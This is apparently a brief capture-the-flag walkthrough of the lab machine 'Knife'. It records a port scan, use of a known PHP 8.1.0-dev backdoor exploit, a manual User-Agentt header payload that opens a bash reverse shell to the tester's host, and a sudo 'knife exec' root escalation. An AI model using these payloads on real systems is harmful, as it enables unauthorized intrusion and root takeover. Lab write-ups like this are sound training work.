----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# Knife
# 16/3/2023
10.10.10.242

----------------------------------------------------
# nmap
----------------------------------------------------
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

intercept http with burp and investicate odd header in response
X-Powered-By: PHP/8.1.0-dev

----------------------------------------------------
# exploitation
----------------------------------------------------
└─$ searchsploit PHP 8.1.0-dev
└─$ searchsploit -m 49933.py  
we got a shell


its not stable I am doing mannually

User-Agentt : zerodiumsystem('bash -c " bash -i >& /dev/tcp/10.10.16.2/6969 0>&1 "');

----------------------------------------------------
# priv esc
----------------------------------------------------
james@knife:~$ sudo -l
    (root) NOPASSWD: /usr/bin/knife
sudo knife exec -E 'exec "/bin/bash"'


